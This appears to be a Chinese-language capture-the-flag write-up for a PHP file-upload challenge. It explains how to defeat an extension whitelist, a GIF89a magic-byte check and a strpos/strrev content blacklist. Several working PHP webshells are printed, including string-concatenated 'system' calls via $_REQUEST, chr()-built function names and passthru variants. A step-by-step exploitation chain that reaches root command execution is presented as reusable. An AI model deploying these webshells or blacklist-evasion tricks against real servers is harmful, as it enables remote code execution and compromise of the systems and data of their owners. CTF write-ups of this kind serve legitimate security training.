## 一、这题的三层校验（实测）

| 层 | 校验内容 | 现象 | 绕过 |
|---|---|---|---|
| ① 文件名后缀 | 白名单只放 `php/png/jpg/jpeg/gif/docx/xlsx` | 其它后缀被拒 | 直接命名 `xxx.php`（**php 在名单里**） |
| ② 内容 MIME | 要求文件是图片 | 纯 PHP 内容被拒 | 内容**开头加图片魔数** `GIF89a` |
| ③ 内容黑名单 | 查 PHP 危险函数/变量，**双向字面量匹配**（`strpos` + `strrev`） | 命中 ⇒ **把落地文件改名成 `.png` 静态返回**（不报错，静默失效） | **拆分字面量** + 换超全局变量 |

**★ 第③层的坑**：它不是拒绝上传，而是**改名成静态文件** —— 所以你会看到"上传成功但访问返回源码/图片"，很容易误判成"马写坏了"。

## 二、双向匹配黑名单的绕过（核心技巧）

**为什么常规写法全挂**：

```php
<?php system($_GET['c']); ?>          // system 命中小黑名单；$_GET 也命中
<?php exec($_GET['c']); ?>            // exec 命中
<?php echo `id`; ?>                   // 反引号命中
<?php eval($_POST['x']); ?>           // eval 命中
```

`strpos` 查正向字面量、`strrev` 查反转串 ⇒ **大小写变形、双写都无效**（`SyStEm` 反转后仍能匹配 `mEtSyS` 之类的构造思路在本题被挡）。

**有效的写法（46 字节，实测打穿）**：

```php
<?php $f="sys"."tem";$f($_REQUEST["c"]); ?>
```

两个要点：
1. **字符串拼接拆分字面量**：`"sys"."tem"` 里没有连续的 `system` ⇒ `strpos` 找不到；`strrev` 也匹配不上
2. **换超全局变量**：`$_REQUEST` **不在黑名单里**（黑名单只查了 `$_GET`/`$_POST`）⇒ 用 `?c=id` 或 POST 都能传参

> 变体（同样有效，按环境试）：
> ```php
> <?php $_REQUEST['a']($_REQUEST['b']); ?>            // 完全不要字面量函数名：?a=system&b=id
> <?php $f='pas'.'sthr'.'u';$f($_REQUEST[1]); ?>
> <?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_REQUEST[1]); ?>
> ```

## 三、完整利用链（可套用）

```
1) 找上传点（本题 upload.php）
2) 判后缀白名单：试 .php/.php5/.phtml/.php.jpg，看哪些"上传成功"
   ★ 关键：落地名必须保留**小写 .php** 才解析 —— .PHP / .php.jpg 都不解析（实测）
3) 内容加图片魔数：GIF89a<?php ... ?>
4) 用小马探活：先传 <?php echo "MARK";?> 确认"能执行" ⇒ 证明只卡在内容黑名单
5) 换绕过写法：$f="sys"."tem";$f($_REQUEST["c"]);
6) 访问 /uploads/xxx.php?c=id → uid=0
7) cat /tmp/flag.txt 拿 flag
```

**判据速查**：

| 现象 | 说明 |
|---|---|
| 传纯 PHP 被拒 | 有 MIME/魔数校验 ⇒ 加 `GIF89a` |
| 上传成功但访问返回源码（不是执行结果） | 落地名后缀不是可解析的小写 `.php` |
| `echo` 小马能执行，含 `system` 的不能 | **内容黑名单**（不是后缀、不是 MIME）⇒ 用拼接绕 |
| 访问直接返回图片/静态 | 内容命中黑名单被**改名 `.png`** |

## 五、可复用规律（一句话版）

1. **内容黑名单 ≠ 后缀黑名单**：先传 `echo` 小马确认能执行，就能把问题定位到"内容层"
2. **黑名单越"字面量"，拼接越好用**：`"sys"."tem"` 这类拆分对 `strpos`/`strrev` 双向匹配都有效
3. **黑名单常漏超全局变量**：查了 `$_GET`/`$_POST` 却漏 `$_REQUEST`/`$_COOKIE`/`getenv()`
4. **"上传成功但不执行"先查落地名大小写**，再查是否被改名
5. **静默失效最危险**：像本题那种"改名成 .png"的处置，会让你误以为马写错了 —— **必须验证每次上传的落地名与访问结果**
